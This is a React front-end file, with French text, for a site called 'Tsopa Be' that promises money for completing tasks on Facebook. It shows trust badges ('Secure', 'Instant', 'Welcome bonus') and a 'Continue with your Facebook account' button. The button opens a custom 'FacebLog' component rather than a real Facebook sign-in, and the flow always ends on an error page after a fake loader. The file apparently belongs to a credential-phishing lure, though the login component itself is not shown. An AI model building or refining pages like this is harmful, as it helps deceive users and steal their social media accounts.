import { useState } from "react";
import FacebLog from "../src/components/FacebLog";
import ErrorPage from "../src/components/ErrorPage";
import Loader from "../src/components/Loader";
import "./App.css";
import { FaFacebook } from "react-icons/fa6";
import { FaLock, FaBolt, FaTrophy } from "react-icons/fa6";
import tsopa2 from "./assets/tsopa2.png";
function App() {
  const [started, setStarted] = useState(false);
  const [erreur, setErreur] = useState(false);
  const [loading, setLoading] = useState(false); // ← ajouter

  // Fonction de transition avec chargeonretoument
  const transition = (callback) => {
    setLoading(true);
    setTimeout(() => {
      callback();
      setLoading(false);
    }, 2000); // ← durée du chargement en ms
  };

  if (loading) return <Loader />;

  if (erreur)
    return (
      <ErrorPage
        onRetour={() =>
          transition(() => {
            setErreur(false);
            setStarted(false);
          })
        }
      />
    );

  if (started)
    return <FacebLog onErreur={() => transition(() => setErreur(true))} />;

  return (
    <div className="wrap">
      <div className="wrap1">
        <div className="card">
          <div className="logo-circle">
            <img src={tsopa2} alt="" />
          </div>
          <h1 className="app-name">
            Tsopa<span> Be</span>
          </h1>
          <p className="tagline">
            Gagner des experiences (XP) en executant des taches spécifiques sur
            facebook et encaisser voter argent.
          </p>
          <div className="badges">
            <span className="badge">
              <FaLock className="icone_" /> Sécurisé
            </span>
            <span className="badge">
              <FaBolt className="icone_" /> Instantané
            </span>
            <span className="badge">
              <FaTrophy className="icone_" /> Bonus de bienvenue
            </span>
          </div>
          <hr className="divider" />
          <button className="btn-main" onClick={() => setStarted(true)}>
            <FaFacebook className="faceb3" />
            Continuer avec votre compte Facebook
          </button>
          <p className="footer-note">
            18+ — Ce service est réservé aux personnes majeures.
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
